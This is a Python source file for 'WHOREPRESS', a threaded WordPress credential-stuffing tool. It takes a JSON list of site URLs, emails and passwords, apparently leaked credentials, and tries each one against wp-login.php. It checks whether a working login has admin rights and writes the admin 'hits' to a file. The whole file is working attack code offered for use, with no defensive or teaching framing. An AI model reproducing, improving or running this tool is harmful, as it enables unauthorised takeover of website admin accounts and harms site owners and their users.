import requests
import json
import os
import time
import threading
from colorama import Fore, init

init(autoreset=True)

class Wordpress:
    def __init__(self):
        self.hits = 0
        self.bad = 0
        self.cpm = 0
        self.result = open('hits.txt', 'a+')
        self.start = time.time()
        threading.Thread(target=self.update_title).start()
        threading.Thread(target=self.calculate_cpm).start()

    def display_ui(self):
        os.system('cls && title [WHOREPRESS] By: KonaN')
        logo = f"""{Fore.GREEN}
             _       ____  ______  ____  __________  ____  ________________
            | |     / / / / / __ \/ __ \/ ____/ __ \/ __ \/ ____/ ___/ ___/
            | | /| / / /_/ / / / / /_/ / __/ / /_/ / /_/ / __/  \__ \\__ \ 
            | |/ |/ / __  / /_/ / _, _/ /___/ ____/ _, _/ /___ ___/ /__/ / 
            |__/|__/_/ /_/\____/_/ |_/_____/_/   /_/ |_/_____//____/____/
            {Fore.RESET}
            {Fore.LIGHTBLUE_EX}Made by KonaN{Fore.RESET}
            {Fore.LIGHTBLUE_EX}Github: https://github.com/KKonaNN/{Fore.RESET}
        """
        print(logo)

    def update_title(self):
        while True:
            elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start))
            os.system(f"title [WHOREPRESS] Hits: {self.hits} ^| Bad: {self.bad} ^| CPM: {self.cpm} ^| Threads: {threading.active_count() - 3} ^| Time elapsed: {elapsed}")
            time.sleep(1)

    def calculate_cpm(self):
        while True:
            old_hits = self.hits
            time.sleep(4)
            self.cpm = (self.hits - old_hits) * 15

    def check_account(self, url, username, password):
        try:
            payload = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
                'testcookie': '1'
            }

            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Referer': url
            }

            if not any(url.startswith(protocol) for protocol in ('http://', 'https://')):
                url = 'https://' + url

            response = requests.post(url, data=payload, headers=headers, timeout=30, cookies={'wordpress_test_cookie': 'WP Cookie check'}, allow_redirects=False)

            if response.status_code == 302 and any(cookie.startswith('wordpress_logged_in') for cookie, value in response.cookies.items()):
                new_url = response.headers['location']
                if new_url.startswith('/'):
                    new_url = 'https:/' + new_url

                r = requests.get(new_url, headers=headers, timeout=30, cookies=response.cookies)
                if 'dashicons-admin-plugins' in r.text: # Check if user is admin or not
                    print(f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}HIT{Fore.RESET} | {url} | {username} | {password}")
                    self.hits += 1
                    self.result.write(f"{url} - {username}|{password}\n")
                else:
                    self.bad += 1
                    print(f"[{Fore.LIGHTRED_EX}-{Fore.RESET}] {Fore.RED}VALID LOGIN / BAD{Fore.RESET} | {url} | {username} | {password}")
            else:
                self.bad += 1
                print(f"[{Fore.LIGHTRED_EX}-{Fore.RESET}] {Fore.RED}BAD{Fore.RESET} | {url} | {username} | {password}")

        except Exception as e: 
            self.bad += 1
            pass
        finally:
            semaphore.release()

def read_accounts(filename):
    with open(filename, "r") as f:
        data = json.load(f).get('Data')
        for account in data:
            yield account

if __name__ == "__main__":
    wp = Wordpress()
    wp.display_ui()
    filename = input("Enter file name: >")
    threads = int(input("Enter threads: >"))
    try:
        semaphore = threading.BoundedSemaphore(value=threads)
        for account in read_accounts(filename):
            semaphore.acquire()
            url, username, password = account.get('URL'), account.get('Email'), account.get('Password')
            if url and username and password:
                threading.Thread(target=wp.check_account, args=(url, username, password)).start()
    except KeyboardInterrupt:
        wp.result.close()
        print("Wait a few seconds for threads to exit...")
        while threading.active_count() - 3 != 0:
            time.sleep(0.1)
        print("Exiting...")
        os._exit(0)
    finally:
        wp.result.close()